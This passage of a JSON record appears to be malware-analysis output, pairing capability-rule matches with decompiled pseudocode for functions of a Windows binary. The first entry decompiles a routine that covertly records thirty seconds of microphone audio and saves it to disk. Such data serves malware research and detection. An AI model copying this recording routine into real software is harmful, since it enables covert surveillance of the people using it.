        "decompiled_code": "\nvoid fcn.00409e40(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    char *pcVar3;\n    uint arg_8h;\n    char *unaff_EBX;\n    \n    pcVar3 = unaff_EBX;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    arg_8h = fcn.0041ff97(pcVar3 + (0x20 - (unaff_EBX + 1)));\n    pcVar2 = _sym.imp.WINMM.dll_mciSendStringA;\n    (*_sym.imp.WINMM.dll_mciSendStringA)(\"open new type waveaudio alias mic buffer 6\", 0, 0, 0);\n    (*pcVar2)(\"record mic\", 0, 0, 0);\n    (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n    (*pcVar2)(\"stop mic\", 0, 0, 0);\n    fcn.00420bd5(arg_8h, \"save mic %s\", unaff_EBX);\n    (*pcVar2)(arg_8h, 0, 0, 0);\n    (*pcVar2)(\"close mic\", 0, 0, 0);\n    fcn.00420c59(arg_8h);\n    return;\n}\n",
        "token_count": 309
    },
    "0040d1a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_240h\n\nvoid __cdecl fcn.0040d1a0(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    uint var_240h;\n    int32_t var_23ch;\n    int32_t var_238h;\n    uint *var_234h;\n    code **var_230h;\n    int32_t var_21ch;\n    int32_t var_218h;\n    uint32_t var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint32_t var_140h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_8h;\n    \n    var_8h = *0x441480 ^ &stack0xfffffffc;\n    var_234h = &var_94h;\n    var_94h = 0x40e880;\n    var_90h = 0x40e920;\n    var_8ch = 0x40e8c0;\n    var_88h = 0x40e960;\n    var_84h = 0x40ea10;\n    var_2ch = 0;\n    var_28h = 0;\n    var_80h = 0;\n    var_24h = 0x43d190;\n    var_20h = 0x7e;\n    var_1ch = 0;\n    var_18h = 0;\n    var_14h = 0;\n    fcn.0040e3d0();\n    iVar1 = fcn.00421d73(in_ECX, 0x43c304);\n    var_238h = iVar1;\n    if (iVar1 != 0) {\n        if (var_21ch == 0) {\n            var_21ch = (**var_230h)(&var_234h, 0, 0x1c);\n        }\n        *(var_21ch + 8) = 0x40e790;\n        *(var_21ch + 0xc) = 0x40e7c0;\n        *(var_21ch + 0x10) = 0x40e810;\n        *(var_21ch + 0x14) = iVar1;\n        var_214h = arg_ch;\n        var_218h = arg_10h;\n        var_210h = 3;\n        var_20ch = 2;\n        fcn.0040dc70();\n        fcn.0040d960(0x43d390, 0, 1);\n        fcn.0040d960(0x43d490, 0, 1);\n        fcn.0040e650();\n        if (var_140h < var_214h) {\n            do {\n                var_23ch = var_140h * arg_10h * 3 + arg_8h;\n                fcn.0040e6c0(&var_23ch);\n            } while (var_140h < var_214h);\n        }\n        fcn.0040e500();\n        fcn.004226f5(var_238h);\n        if (var_230h != NULL) {\n            (*var_230h[10])(&var_234h);\n        }\n    }\n    fcn.00420bc6(arg_8h);\n    return;\n}\n",
        "token_count": 841
    },
    "0040db30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040db30(uint param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX < 1) {\n        iVar1 = 5000;\n    }\n    else {\n        if (in_EAX < 0x65) {\n            if (in_EAX < 0x32) {\n                iVar1 = 5000 / in_EAX;\n                goto code_r0x0040db64;\n            }\n        }\n        else {\n            in_EAX = 100;\n        }\n        iVar1 = (100 - in_EAX) * 2;\n    }\ncode_r0x0040db64:\n    fcn.0040d960(0x43d390, iVar1, param_1);\n    fcn.0040d960(0x43d490, iVar1, param_1);\n    return;\n}\n",
        "token_count": 195
    },
    "0040e3d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.0040e3d0(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *unaff_ESI;\n    \n    uVar1 = unaff_ESI[3];\n    uVar2 = *unaff_ESI;\n    unaff_ESI[1] = 0;\n    fcn.00429890();\n    *(unaff_ESI + 4) = 0;\n    *unaff_ESI = uVar2;\n    unaff_ESI[3] = uVar1;\n    fcn.00410cf0();\n    unaff_ESI[2] = 0;\n    unaff_ESI[6] = 0;\n    unaff_ESI[0x15] = 0;\n    unaff_ESI[0x16] = 0;\n    unaff_ESI[0x17] = 0;\n    unaff_ESI[0x18] = 0;\n    unaff_ESI[0x19] = 0;\n    unaff_ESI[0x1a] = 100;\n    unaff_ESI[0x1b] = 100;\n    unaff_ESI[0x1c] = 100;\n    unaff_ESI[0x1d] = 100;\n    unaff_ESI[0x1e] = 0;\n    unaff_ESI[0x22] = 0;\n    unaff_ESI[0x1f] = 0;\n    unaff_ESI[0x23] = 0;\n    unaff_ESI[0x20] = 0;\n    unaff_ESI[0x24] = 0;\n    unaff_ESI[0x21] = 0;\n    unaff_ESI[0x25] = 0;\n    unaff_ESI[0x5a] = 8;\n    unaff_ESI[0x5b] = 0x43cc88;\n    unaff_ESI[0x5c] = 0x3f;\n    unaff_ESI[0x66] = 0;\n    *(unaff_ESI + 0xc) = *0x43cc38;\n    unaff_ESI[5] = 100;\n    return;\n}\n",
        "token_count": 494
    },
    "0040e490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040e490(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x58) != 0) {\n        *(*(in_EAX + 0x58) + 0x80) = 0;\n    }\n    if (*(in_EAX + 0x5c) != 0) {\n        *(*(in_EAX + 0x5c) + 0x80) = 0;\n    }\n    if (*(in_EAX + 0x60) != 0) {\n        *(*(in_EAX + 0x60) + 0x80) = 0;\n    }\n    if (*(in_EAX + 100) != 0) {\n        *(*(in_EAX + 100) + 0x80) = 0;\n    }\n    piVar1 = in_EAX + 0x88;\n    iVar2 = 4;\n    do {\n        if (piVar1[-4] != 0) {\n            *(piVar1[-4] + 0x111) = 0;\n        }\n        if (*piVar1 != 0) {\n            *(*piVar1 + 0x111) = 0;\n        }\n        piVar1 = piVar1 + 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 321
    },
    "0040e650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.0040e650(void)\n\n{\n    int32_t *unaff_ESI;\n    \n    if (unaff_ESI[5] != 100) {\n        *(*unaff_ESI + 0x14) = 0x15;\n        *(*unaff_ESI + 0x18) = unaff_ESI[5];\n        (***unaff_ESI)();\n    }\n    fcn.0040e490();\n    (**(*unaff_ESI + 0x10))();\n    (**(unaff_ESI[6] + 8))();\n    fcn.00410e10();\n    (**unaff_ESI[0x5d])();\n    unaff_ESI[0x3d] = 0;\n    unaff_ESI[5] = (*(unaff_ESI + 0x34) != '\\0') + 0x65;\n    return;\n}\n",
        "token_count": 195
    },
    "0040ea30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040ea30(uchar param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t *unaff_ESI;\n    \n    piVar2 = unaff_ESI[6];\n    **piVar2 = 0xff;\n    *piVar2 = *piVar2 + 1;\n    piVar1 = piVar2 + 1;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        cVar3 = (*piVar2[3])();\n        if (cVar3 == '\\0') {\n            *(*unaff_ESI + 0x14) = 0x19;\n            (***unaff_ESI)();\n        }\n    }\n    piVar2 = unaff_ESI[6];\n    **piVar2 = param_1;\n    *piVar2 = *piVar2 + 1;\n    piVar1 = piVar2 + 1;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        cVar3 = (*piVar2[3])();\n        if (cVar3 == '\\0') {\n            *(*unaff_ESI + 0x14) = 0x19;\n    // WARNING: Could not recover jumptable at 0x0040ea8f. Too many branches\n    // WARNING: Treating indirect jump as call\n            (***unaff_ESI)();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 347
    },
    "00412a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00412a10(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x194) = puVar1;\n    *puVar1 = 0x412830;\n    puVar1[2] = fcn.004116c0;\n    puVar2 = puVar1 + 0x23;\n    iVar3 = 0x10;\n    do {\n        puVar2[-0x10] = 0;\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    *(puVar1 + 0x33) = 0x71;\n    return;\n}\n",
        "token_count": 202
    },
    "004138d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004138d0(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t *piVar7;\n    int32_t iStack4;\n    \n    piVar4 = *(param_2 + 0xcc);\n    iVar5 = 0;\n    iVar3 = 0;\n    iStack4 = 0;\n    if (0 < *(param_2 + 200)) {\n        piVar1 = piVar4 + 6;\n        do {\n            if (iVar3 != iVar5) {\n                piVar6 = piVar4;\n                piVar7 = piVar1 + -6;\n                for (iVar2 = 9; iVar5 = iStack4,  iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *piVar7 = *piVar6;\n                    piVar6 = piVar6 + 1;\n                    piVar7 = piVar7 + 1;\n                }\n            }\n            iVar2 = *(param_2 + 0x170);\n            if (piVar1[-1] == iVar2 || piVar1[-1] < iVar2) {\n                if (*piVar1 != iVar2 && iVar2 <= *piVar1) {\n                    *piVar1 = iVar2;\n                }\n                iVar5 = iVar5 + 1;\n                piVar1 = piVar1 + 9;\n                iStack4 = iVar5;\n            }\n            iVar3 = iVar3 + 1;\n            piVar4 = piVar4 + 9;\n        } while (iVar3 < *(param_2 + 200));\n    }\n    *(param_2 + 200) = iVar5;\n    return;\n}\n",
        "token_count": 414
    },
    "00413e50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413e50(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x174) = puVar1;\n    *puVar1 = 0x413c10;\n    puVar1[1] = 0x413db0;\n    puVar1[2] = 0x413de0;\n    *(puVar1 + 0xd) = 0;\n    fcn.00413120();\n    if (*(in_EAX + 0xcc) == 0) {\n        *(in_EAX + 0xf8) = 0;\n        *(in_EAX + 200) = 1;\n    }\n    else {\n        fcn.004134d0();\n        if (*(in_EAX + 0x168) < 8) {\n            fcn.004138d0();\n        }\n    }\n    if (((*(in_EAX + 0xf8) != '\\0') || (*(in_EAX + 0x168) < 8)) && (*(in_EAX + 0xd1) == '\\0')) {\n        *(in_EAX + 0xd2) = 1;\n    }\n    puVar1[4] = 0;\n    puVar1[7] = 0;\n    puVar1[5] = 0;\n    if (*(in_EAX + 0xd2) != '\\0') {\n        puVar1[6] = *(in_EAX + 200) * 2;\n        return;\n    }\n    puVar1[6] = *(in_EAX + 200);\n    return;\n}\n",
        "token_count": 372
    },
    "004146a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004146a0(int32_t noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint arg_4ch_2, uint noname_18, uint arg_4ch\n            , uint noname_20, uint arg_54h, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint noname_33, uint noname_34, uint noname_35, uint noname_36, uint noname_37, \n            uint noname_38, uint noname_39, uint noname_40, uint noname_41, uint noname_42, uint noname_43, \n            uint noname_44, uint noname_45, uint noname_46, uint noname_47, uint noname_48, uint noname_49, \n            uint noname_50, uint noname_51, uint noname_52, uint noname_53, uint noname_54, uint noname_55, \n            uint noname_56, uint noname_57, uint noname_58, uint noname_59, uint noname_60, uint noname_61, \n            uint noname_62, uint noname_63, uint noname_64, uint noname_65, uint noname_66, uint noname_67, \n            uint noname_68, uint noname_69, uint noname_70, uint noname_71, uint noname_72, uint noname_73, \n            uint noname_74, uint noname_75, uint noname_76, uint noname_77, uint noname_78, uint noname_79, \n            uint noname_80, uint noname_81, uint noname_82, uint noname_83, uint noname_84, uint noname_85, \n            uint noname_86, uint noname_87, uint noname_88, uint noname_89, uint noname_90, uint noname_91, \n            uint noname_92, uint noname_93, uint noname_94, uint noname_95, uint arg_180h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t var_4h;\n    uint *puStack8;\n    \n    puStack8 = (***(noname_0 + 4))(noname_0, 1, 0x68);\n    *(noname_0 + 0x180) = puStack8;\n    *puStack8 = 0x413f10;\n    if (noname_1 != '\\0') {\n        var_4h = 0;\n        if (0 < *(noname_0 + 0x4c)) {\n            piVar5 = *(noname_0 + 0x54) + 8;\n            puStack8 = puStack8 + 0x10;\n            do {\n                iVar2 = piVar5[1];\n                iVar4 = piVar5[6] + -1 + iVar2;\n                iVar1 = piVar5[5] + -1 + *piVar5;\n                uVar3 = (**(*(noname_0 + 4) + 0x14))\n                                  (noname_0, 1, 0, iVar1 - iVar1 % *piVar5, iVar4 - iVar4 % iVar2, iVar2);\n                *puStack8 = uVar3;\n                var_4h = var_4h + 1;\n                puStack8 = puStack8 + 1;\n                piVar5 = piVar5 + 0x16;\n            } while (var_4h < *(noname_0 + 0x4c));\n        }\n        return;\n    }\n    iVar4 = (**(*(noname_0 + 4) + 4))(noname_0, 1, 0x500);\n    puStack8[7] = iVar4 + 0x80;\n    puStack8[8] = iVar4 + 0x100;\n    puStack8[9] = iVar4 + 0x180;\n    puStack8[10] = iVar4 + 0x200;\n    puStack8[0xb] = iVar4 + 0x280;\n    puStack8[0xc] = iVar4 + 0x300;\n    puStack8[6] = iVar4;\n    puStack8[0xd] = iVar4 + 0x380;\n    puStack8[0xe] = iVar4 + 0x400;\n    puStack8[0xf] = iVar4 + 0x480;\n    puStack8[0x10] = 0;\n    return;\n}\n",
        "token_count": 1204
    },
    "00417c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid fcn.00417c40(void)\n\n{\n    uint *puVar1;\n    int32_t unaff_ESI;\n    \n    puVar1 = (***(unaff_ESI + 4))();\n    *(unaff_ESI + 0x194) = puVar1;\n    *puVar1 = 0x417a00;\n    puVar1[0xf] = 0;\n    puVar1[0xb] = 0;\n    puVar1[0x17] = 0;\n    puVar1[0x13] = 0;\n    puVar1[0x10] = 0;\n    puVar1[0xc] = 0;\n    puVar1[0x18] = 0;\n    puVar1[0x14] = 0;\n    puVar1[0x11] = 0;\n    puVar1[0xd] = 0;\n    puVar1[0x19] = 0;\n    puVar1[0x15] = 0;\n    puVar1[0x12] = 0;\n    puVar1[0xe] = 0;\n    puVar1[0x1a] = 0;\n    puVar1[0x16] = 0;\n    if (*(unaff_ESI + 0xf8) != '\\0') {\n        puVar1[0x22] = 0;\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "004207d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004207d8(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    fcn.00421cb7(arg_8h, *(arg_ch * 4 + 0x439458), arg_10h);\n    return;\n}\n",
        "token_count": 65
    },
    "00421d73": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421d73(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00421cb7(arg_8h, arg_ch, 0x40);\n    return;\n}\n",
        "token_count": 47
    },
    "00422b02": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422b02(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00422a94(fcn.00429fe7, arg_ch, 0, &arg_10h);\n    return;\n}\n",
        "token_count": 60
    },
    "00423277": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00423277(uint arg_8h)\n\n{\n    fcn.00423137(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 39
    },
    "0042ca5a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042ca6e)\n// WARNING: Removing unreachable block (ram,0x0042ca74)\n// WARNING: Removing unreachable block (ram,0x0042ca76)\n\nvoid fcn.0042ca5a(void)\n\n{\n    return;\n}\n",
        "token_count": 66
    },
    "004333a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004333a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004276c0(0x43f708, 0x14);\n    *(unaff_EBP + -0x1c) = 0;\n    puVar1 = *(unaff_EBP + 0x18);\n    if (((puVar1 == NULL) || (*puVar1 = 0xffffffff,  *(unaff_EBP + 8) == 0)) ||\n       ((*(unaff_EBP + 0x1c) != 0 && ((*(unaff_EBP + 0x14) & 0xfffffe7f) != 0)))) {\n        puVar1 = fcn.00426e0a();\n        *puVar1 = 0x16;\n        fcn.00426db8();\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.00432c6c(unaff_EBP + -0x1c, *(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                             *(unaff_EBP + 0x14));\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00433436();\n        if (*(unaff_EBP + -0x20) != 0) {\n            *puVar1 = 0xffffffff;\n        }\n    }\n    fcn.00427705();\n    return;\n}\n",
        "token_count": 441
    },
    "00433464": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433464(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.004333a0(arg_ch, arg_10h, arg_14h, arg_18h, arg_8h, 1);\n    return;\n}\n",
        "token_count": 77
    },
    "00437bd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00437bd0(uint param_1, uint param_2)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    float fVar4;\n    float10 in_ST0;\n    uint32_t uStack32;\n    float fStack28;\n    \n    if (*0x444b68 == 0) {\n        uVar1 = ROUND(in_ST0);\n        uStack32 = uVar1;\n        fStack28 = uVar1 >> 0x20;\n        fVar4 = in_ST0;\n        if ((uStack32 != 0) || (fVar4 = fStack28,  (uVar1 & 0x7fffffff00000000) != 0)) {\n            if (fVar4 < 0) {\n                uVar2 = 0x80000000 < (in_ST0 - uVar1 ^ 0x80000000);\n                bVar3 = CARRY4(uStack32, uVar2);\n                uStack32 = uStack32 + uVar2;\n                fStack28 = fStack28 + bVar3;\n            }\n            else {\n                uVar2 = 0x80000000 < in_ST0 - uVar1;\n                bVar3 = uStack32 < uVar2;\n                uStack32 = uStack32 - uVar2;\n                fStack28 = fStack28 - bVar3;\n            }\n        }\n        return CONCAT44(fStack28, uStack32);\n    }\n    return CONCAT44(param_2, in_ST0);\n}\n",
        "token_count": 343
    },
    "0042425a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042425a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0042e894(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "00425301": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425301(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.004214f1(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "004039f0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.004039f0(void)\n\n{\n    char cVar1;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    \n    cVar1 = (**(*unaff_EDI + 4))();\n    if (cVar1 != '\\0') {\n        *(unaff_ESI + 0x44) = 0;\n        return;\n    }\n    *(unaff_ESI + 0x10) = unaff_ESI + 8;\n    *(unaff_ESI + 0x20) = unaff_ESI + 0x18;\n    *(unaff_ESI + 0x24) = unaff_ESI + 0x1c;\n    *(unaff_ESI + 0x44) = unaff_EDI;\n    *(unaff_ESI + 0x14) = unaff_ESI + 0xc;\n    *(unaff_ESI + 0x30) = unaff_ESI + 0x28;\n    *(unaff_ESI + 0x34) = unaff_ESI + 0x2c;\n    *(unaff_ESI + 0xc) = 0;\n    **(unaff_ESI + 0x24) = 0;\n    **(unaff_ESI + 0x34) = 0;\n    **(unaff_ESI + 0x10) = 0;\n    **(unaff_ESI + 0x20) = 0;\n    **(unaff_ESI + 0x30) = 0;\n    return;\n}\n",
        "token_count": 345
    },
    "004365d9": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.004365d9(void)\n\n{\n    *0x442580 = (*_sym.imp.KERNEL32.DLL_CreateFileW)(L\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "004099f0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004099f0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    \n    pcVar2 = _sym.imp.USER32.dll_GetMessageA;\n    iVar4 = (*_sym.imp.USER32.dll_GetMessageA)(0x444a5c, 0, 0, 0);\n    pcVar3 = _sym.imp.USER32.dll_DispatchMessageA;\n    pcVar1 = _sym.imp.USER32.dll_TranslateMessage;\n    while (iVar4 != 0) {\n        (*pcVar1)(0x444a5c);\n        (*pcVar3)(0x444a5c);\n        iVar4 = (*pcVar2)(0x444a5c, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "0041ff97": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041ff97(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *apcStack20 [3];\n    char *pcStack8;\n    \n    do {\n        iVar2 = fcn.00422819(param_1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.00429cc7(param_1);\n    } while (iVar2 != 0);\n    if ((*0x443cc8 & 1) == 0) {\n        *0x443cc8 = *0x443cc8 | 1;\n        pcStack8 = \"bad allocation\";\n        fcn.0042100c(&pcStack8);\n        *0x443cbc = vtable.std::bad_alloc.0;\n        fcn.00422a7d(0x43878c);\n    }\n    fcn.00421140(0x443cbc);\n    apcStack20[0] = vtable.std::bad_alloc.0;\n    fcn.00424181(apcStack20, 0x43f8b4);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 267
    },
    "00429a53": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00429a53(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004276c0(0x43f418, 0xc);\n    fcn.0042766f(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x4441b0;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x4441ac;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x00429a97;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.004214f1(arg_8h_00);\ncode_r0x00429a97:\n        fcn.004214f1(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00429aba();\n    fcn.00427705();\n    return;\n}\n",
        "token_count": 396
    },
    "0042b000": {
        "rules": [
            "contain loop"
        ],
